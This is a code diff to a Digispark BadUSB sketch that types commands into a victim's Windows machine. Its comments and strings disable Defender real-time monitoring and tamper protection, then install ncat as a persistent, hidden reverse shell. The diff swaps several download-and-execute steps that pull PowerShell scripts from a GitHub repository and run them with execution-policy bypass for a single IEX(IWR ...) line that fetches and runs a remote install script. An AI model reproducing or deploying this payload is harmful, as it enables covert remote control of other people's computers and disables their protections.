@@ -17,6 +17,7 @@ void setup() {
     pinMode(1, OUTPUT); // Enable LED
     digitalWrite(1, LOW); // Turn LED off
     DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
+    
 
 //DISABLE TAMPER PROTECTION
     DigiKeyboard.delay(2000); // DELAY 2000
@@ -65,23 +66,9 @@ void setup() {
 
 // DOWNLOADS POWERSHELL SCRIPT TO: DISABLE DEFENDER MONITORING, DOWNLOAD NCAT, EXPORT NCAT, MOVE NC.EXE TO SYS32, ADD REGISTRY TO RESTART CONNECTION ON RESTARTING PC, AND STARTING CONNECTION WHILE HIDING WINDOWS/PROCESS.
     DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
-  
-    DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/install.ps1') | Set-Content -Path 'C:\\TEMP\\install.ps1'");
+    DigiKeyboard.println("IEX(IWR https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/install.ps1 -UseBasicParsing)");
     DigiKeyboard.delay(100); // DELAY 100
     DigiKeyboard.sendKeyStroke(40, 0); // ENTER
-  
-    DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1') | Set-Content -Path 'C:\\TEMP\\reverse.ps1'");
-    DigiKeyboard.delay(100); // DELAY 100
-    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
-  
-    DigiKeyboard.println("powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\install.ps1");
-    DigiKeyboard.delay(100); // DELAY 100
-    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
-  
-    DigiKeyboard.println("powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\reverse.ps1");
-    DigiKeyboard.delay(100); // DELAY 100
-    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
-
 
 //END SCRIPT
   DigiKeyboard.delay(100);  
